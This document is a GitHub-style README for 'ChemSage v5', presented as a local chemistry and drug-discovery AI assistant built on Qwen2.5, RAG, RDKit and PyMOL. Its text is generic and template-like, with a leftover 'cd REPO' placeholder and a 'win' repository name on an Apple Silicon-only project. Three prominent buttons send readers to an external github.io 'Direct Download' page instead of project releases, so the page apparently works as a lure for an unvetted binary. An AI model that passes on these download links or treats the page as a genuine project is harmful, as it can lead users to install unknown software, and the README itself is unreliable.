# ChemSage v5 - Chemistry-aware AI assistant 2026

> **ChemSage is a local chemistry-focused AI assistant for Apple Silicon that combines retrieval, fine-tuned language modeling, and live scientific tools for drug discovery workflows in version 5.**

[![Platform](https://img.shields.io/badge/Platform-Apple%20Silicon-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jasonz1992/chemsage-win-76082?style=flat-square)](https://github.com/jasonz1992/chemsage-win-76082)

---

<p align="center">
  <a href="https://jasonz1992.github.io/chemsage-win-76082/">
    <img src="https://img.shields.io/badge/Download-ChemSage%20Latest-brightgreen?style=for-the-badge" alt="Download ChemSage">
  </a>
</p>

> **[Direct Download - ChemSage v5](https://jasonz1992.github.io/chemsage-win-76082/)**

---

[Download Latest Build](https://jasonz1992.github.io/chemsage-win-76082/)

---

## About ChemSage

ChemSage is a chemistry-aware AI assistant designed for drug discovery, medicinal chemistry, and cheminformatics work. It combines retrieval-augmented generation with a QLoRA fine-tuned Qwen2.5 language model, allowing responses to draw on private chemistry and biology corpora while using domain-specific behavior.

The assistant can run locally on Apple Silicon through MLX-LM and connect language-based reasoning with practical scientific utilities. RDKit and PyMOL integration supports molecular validation, property analysis, visualization, docking interpretation, and protein-ligand interaction review.

---

## Features

- Retrieval-augmented generation grounded in private chemistry and biology collections
- QLoRA fine-tuning based on the Qwen2.5 language model
- Local inference on Apple Silicon through MLX-LM
- Live RDKit execution for chemical calculations and SMILES validation
- PyMOL tooling for molecular visualization and structural analysis
- Support for docking results and protein-ligand interaction interpretation
- Chemistry-aware evaluation and dataset validation workflows
- Web demo deployment through Hugging Face ZeroGPU

---

## Installation

Clone the repository locally:

```bash
git clone https://github.com/jasonz1992/chemsage-win-76082.git
cd REPO
```

Prepare the Apple Silicon environment and install the dependencies described by the project configuration. The required components include MLX-LM, RDKit, PyMOL, and the tooling used by the retrieval and model-serving layers.

After setup, launch the included application or demo entry point. For a hosted demonstration, use the Hugging Face ZeroGPU deployment configuration supplied with the project.

---

## Usage

A typical ChemSage workflow can follow these steps:

1. Start the local inference application on an Apple Silicon Mac.
2. Provide a chemistry or biology question for retrieval-grounded analysis.
3. Ask ChemSage to validate a SMILES string or calculate relevant chemical properties.
4. Use RDKit and PyMOL tools to inspect molecules, proteins, or interactions.
5. Review docking output and request an interpretation of protein-ligand contacts.
6. Compare answers against the project's chemistry-aware evaluation or validation datasets.

Example tasks include:

- Checking whether a SMILES representation is valid
- Reviewing molecular properties during compound triage
- Querying private research documents with retrieval support
- Inspecting protein-ligand interaction information
- Interpreting docking results alongside structural context

---

## Configuration

Configure ChemSage through the project files and environment settings included in the repository. A deployment may require values for the model, retrieval corpus, tool integrations, and optional hosted-demo settings.

A representative configuration might look like this:

```yaml
model:
  family: Qwen2.5
  adapter: QLoRA
  runtime: MLX-LM

retrieval:
  enabled: true
  corpus: ./data

tools:
  rdkit: true
  pymol: true
```

Use repository-provided configuration examples as the authoritative reference for available options and expected paths.

---

## Requirements

- Apple Silicon hardware for local inference
- A compatible macOS environment
- MLX-LM for locally hosted model execution
- RDKit for cheminformatics operations
- PyMOL for molecular visualization and structural tooling
- Access to the project's chemistry and biology corpora when using retrieval
- Sufficient local storage for model files, datasets, and related assets
- Hugging Face ZeroGPU support for the optional web demo deployment

---

## FAQ

### Who is ChemSage for?

ChemSage is intended for users working with drug discovery, medicinal chemistry, cheminformatics, molecular structures, and related chemistry or biology research workflows.

### Can ChemSage run locally?

Yes. The project is designed for local inference on Apple Silicon using MLX-LM.

### How does retrieval work?

Retrieval-augmented generation connects responses to selected private chemistry and biology corpora. Configure the corpus according to the repository's supplied settings.

### Can I use RDKit and PyMOL together with the assistant?

ChemSage supports live RDKit and PyMOL tool execution for chemical calculations, SMILES validation, molecular inspection, and structural analysis.

### How do I update to a newer build?

Check the repository for the latest release or build, update the local checkout, and review any accompanying configuration or dependency changes before relaunching the application.

### What should I check if startup fails?

Confirm that the environment matches the Apple Silicon requirement, model assets are available, dependencies are installed, and configured corpus or tool paths are valid. Review the project output for the first reported configuration or runtime error.

### Where should settings be changed?

Use the repository's configuration files and environment settings. Keep model, retrieval, RDKit, PyMOL, and deployment values aligned with the examples provided by the project.

---

## Roadmap

- Continue improving chemistry-aware evaluation and dataset validation
- Expand retrieval support for private scientific corpora
- Refine RDKit and PyMOL tool workflows
- Improve interpretation of docking and protein-ligand interaction results
- Maintain local Apple Silicon inference and ZeroGPU web deployment paths

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
